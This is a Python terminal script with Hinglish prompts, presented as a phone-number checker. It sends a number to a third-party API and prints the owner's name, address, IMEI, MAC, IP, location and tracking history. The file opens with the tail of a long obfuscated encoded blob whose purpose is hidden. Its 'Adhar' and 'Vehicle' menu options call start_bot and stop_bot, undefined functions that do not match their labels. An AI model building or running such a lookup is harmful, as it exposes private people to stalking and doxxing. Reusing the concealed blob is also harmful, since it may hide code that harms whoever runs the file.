bsdLbjs7zIG9o52RosymM2+D5IDlQ87we2R+1mrE+IpLrPzJAG0yEszaaPC90OHhZ+FdZnJ32LFuEV0jU1eCZQB8xLBig77TCJlRpDHXo2KkzOOWBjsaOHHunqtbSyGDFBklE5Qcb7GpSJLzWOn1+CxeWVK3oOlJtZauEJ5fO7J1Ri1WNLi6iS3LWQMSYrqCfif7G5B9jws9MgYBKcTaaHpmhf/akmJMzDYleOZ1QS5tkzkkGYEynCtElNzHrs+6mKwghZcSKuR+HeXlVI8iHl5mG/ohq9egfQ1T0Vtkv3uSKDs/6hu1lN3yFTchOXJKChoqRKpanmXc8XbMnWCilpimKu7cRu/T1adpTPqr3cdFIkfFnjaYGcAmHN0CousNrXRFb3jMImJnJUztbLVCFzosebn6YY3pYbTjvPwmhCFpI5XCXAhN66ALHm2+ClHbLjgnHhTi0Fekx0g2TWLDXB/wkWEN2zl+W7A2nRa9H+teX5FxOOE7jso6b9cB8FWwktP1kTytKDrR56HdT0dJiG5/NCl8K524w2slGy7Hu5d+72gapaxDhA4gSvWPxJIOaVuDFDvJ9D7cxMYtqSCEysKy0i0mkHEr5gabwVzn0MTaA7V1txJhfdP66anmgeg/Uo9rH/x0ZiMlVkFgB7awVBkMA7nG4P80Cee14HmvhWmYXZ8jh1Olzx3QvSI5RCQ9MYduq2fu0acM2LmMfI+rwzQDzwVAzZ+TZSVlgD3Mn01uJV8YpBW1nQVNeiD9vbJKBPP3LRNJYU2ue4pqThCszzlbtT70US7EAQAEBBC1O5H0/977//vvbfRcH1A7lz3y9BIOQ2fo7s7h/nOAAYNc3kbGsYVTdYRWgNhWW0mVwJe'))

# ==================== PHONE NUMBER CHECKER ====================

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
\033[1;31m ██████╗ \033[1;33m ██████╗ \033[1;32m████████╗\033[1;36m██╗      \033[1;34m ██████╗ \033[1;35m███████╗\033[1;31m████████╗\033[1;33m██╗███╗   ██╗
\033[1;31m██╔══██╗\033[1;33m██╔════╝ \033[1;32m╚══██╔══╝\033[1;36m██║     \033[1;34m██╔═══██╗\033[1;35m██╔════╝\033[1;31m╚══██╔══╝\033[1;33m██║████╗  ██║
\033[1;31m██║  ██║\033[1;33m██║  ███╗\033[1;32m   ██║   \033[1;36m██║     \033[1;34m██║   ██║\033[1;35m███████╗\033[1;31m   ██║   \033[1;33m██║██╔██╗ ██║
\033[1;31m██║  ██║\033[1;33m██║   ██║\033[1;32m   ██║   \033[1;36m██║     \033[1;34m██║   ██║\033[1;35m╚════██║\033[1;31m   ██║   \033[1;33m██║██║╚██╗██║
\033[1;31m██████╔╝\033[1;33m╚██████╔╝\033[1;32m   ██║   \033[1;36m███████╗\033[1;34m╚██████╔╝\033[1;35m███████║\033[1;31m   ██║   \033[1;33m██║██║ ╚████║
\033[1;31m╚═════╝ \033[1;33m ╚═════╝ \033[1;32m   ╚═╝   \033[1;36m╚══════╝\033[1;34m ╚═════╝ \033[1;35m╚══════╝\033[1;31m   ╚═╝   \033[1;33m╚═╝╚═╝  ╚═══╝
\033[0m
"""
    print(banner)

def loading_animation(message):
    for i in range(3):
        print(f"\r{message}{'.' * (i+1)}   ", end='', flush=True)
        time.sleep(0.5)
    print('\r' + ' ' * (len(message)+5), end='\r')

def check_number():
    number = input(f"{YELLOW}📱 Number daalo (country code ke saath, jaise +9198xxxxxxxx): {RESET}").strip()
    if not number:
        print(f"{RED}❌ Error: Number to daalo bhai!{RESET}")
        input(f"{BLUE}Press Enter to continue...{RESET}")
        return

    print(f"{BLUE}🔄 Checking number: {number}{RESET}")
    loading_animation("⏳ Please wait")

    url = "https://abbas-apis.vercel.app/api/phone"
    params = {"number": number}
    try:
        response = requests.get(url, params=params, timeout=10)
        response.raise_for_status()
        data = response.json()
    except Exception as e:
        print(f"{RED}❌ Error: API se response nahi aaya. Internet check karo.\n{e}{RESET}")
        input(f"{BLUE}Press Enter to continue...{RESET}")
        return

    print(f"\n{GREEN}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{CYAN}📋 API Response (Full JSON):{RESET}")
    print(f"{GREEN}═══════════════════════════════════════════════════════════{RESET}")
    print(json.dumps(data, indent=2, ensure_ascii=False))

    print(f"\n{GREEN}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{CYAN}📌 Important Details (Parsed):{RESET}")
    print(f"{GREEN}═══════════════════════════════════════════════════════════{RESET}")

    success = data.get("success")
    if success:
        info = data.get("data", {})
        owner_name = info.get("Owner Name", "N/A")
        owner_address = info.get("Owner Address", "N/A")
        owner_phone = info.get("Number", "N/A")
        imei = info.get("IMEI Number", "N/A")
        mac = info.get("MAC Address", "N/A")
        ip = info.get("IP Address", "N/A")
        location = info.get("Mobile Locations", "N/A")
        hometown = info.get("Hometown", "N/A")
        connection = info.get("Connection", "N/A")
        street = info.get("Owner Address", "N/A")
        city = info.get("Hometown", "N/A")
        state = info.get("Mobile State", "N/A")
        country = info.get("Country", "N/A")
        track_id = info.get("Tracker ID", "N/A")
        tracking_history = info.get("Tracking History", "N/A")

        print(f"\n{BOLD}{BLUE}👤 Owner Info:{RESET}")
        print(f"   {YELLOW}Name    :{RESET} {owner_name}")
        print(f"   {YELLOW}Phone   :{RESET} {owner_phone}")
        print(f"   {YELLOW}Address :{RESET} {owner_address}")

        print(f"\n{BOLD}{BLUE}📱 Device Info:{RESET}")
        print(f"   {YELLOW}IMEI    :{RESET} {imei}")
        print(f"   {YELLOW}MAC     :{RESET} {mac}")
        print(f"   {YELLOW}IP      :{RESET} {ip}")

        print(f"\n{BOLD}{BLUE}📍 Location Info:{RESET}")
        print(f"   {YELLOW}Mobile Locations :{RESET} {location}")
        print(f"   {YELLOW}Hometown        :{RESET} {hometown}")
        print(f"   {YELLOW}Connection      :{RESET} {connection}")

        print(f"\n{BOLD}{BLUE}🏠 Address Details:{RESET}")
        print(f"   {YELLOW}Street :{RESET} {street}")
        print(f"   {YELLOW}City   :{RESET} {city}")
        print(f"   {YELLOW}State  :{RESET} {state}")
        print(f"   {YELLOW}Country:{RESET} {country}")

        print(f"\n{BOLD}{BLUE}🔍 Tracking Info:{RESET}")
        print(f"   {YELLOW}Track ID        :{RESET} {track_id}")
        print(f"   {YELLOW}Tracking History:{RESET} {tracking_history}")
    else:
        print(f"{RED}❌ Data nahi mila is number ke liye.{RESET}")

    print(f"{GREEN}═══════════════════════════════════════════════════════════{RESET}\n")
    input(f"{BLUE}✅ Done! Press Enter to continue...{RESET}")

def run_number_checker():
    while True:
        clear_screen()
        print_banner()
        print(f"{BOLD}{CYAN}Number Checker Menu:{RESET}")
        print(f"   {GREEN}1.{RESET} 📱 Check another number")
        print(f"   {RED}2.{RESET} 🔙 Back to main menu")
        print()
        choice = input(f"{YELLOW}Apna choice daaliye (1 ya 2): {RESET}").strip()
        if choice == "1":
            check_number()
        elif choice == "2":
            break
        else:
            print(f"{RED}❌ Galat choice! Dubara try karo.{RESET}")
            input(f"{BLUE}Press Enter to continue...{RESET}")

# ==================== MAIN MENU ====================

def main():
    # Ensure necessary modules are installed
    try:
        import requests
    except ImportError:
        os.system("pip install requests")
        import requests

    while True:
        clear_screen()
        print_banner()
        print(f"{BOLD}{CYAN}MAIN MENU{RESET}")
        print(f"{GREEN}════════════════════════════════{RESET}")
        print(f"   {GREEN}1.{RESET} 📱 Number Lookup")
        print(f"   {GREEN}2.{RESET} 🆔 Adhar Lookup")
        print(f"   {GREEN}3.{RESET} 🚙 Vehicle Lookup")
        print(f"   {GREEN}4.{RESET} 🚪 Exit")
        print()
        choice = input(f"{YELLOW}Apna choice daaliye (1-4): {RESET}").strip()

        if choice == "1":
            run_number_checker()
        elif choice == "2":
            start_bot()
            input(f"{BLUE}Press Enter to continue...{RESET}")
        elif choice == "3":
            stop_bot()
            input(f"{BLUE}Press Enter to continue...{RESET}")
        elif choice == "4":
            if bot_running:
                stop_bot()
            print(f"{GREEN}👋 Bye bye!{RESET}")
            break
        else:
            print(f"{RED}❌ Galat choice! Dubara try karo.{RESET}")
            input(f"{BLUE}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if bot_running:
            stop_bot()
        print(f"\n{GREEN}👋 Exiting...{RESET}")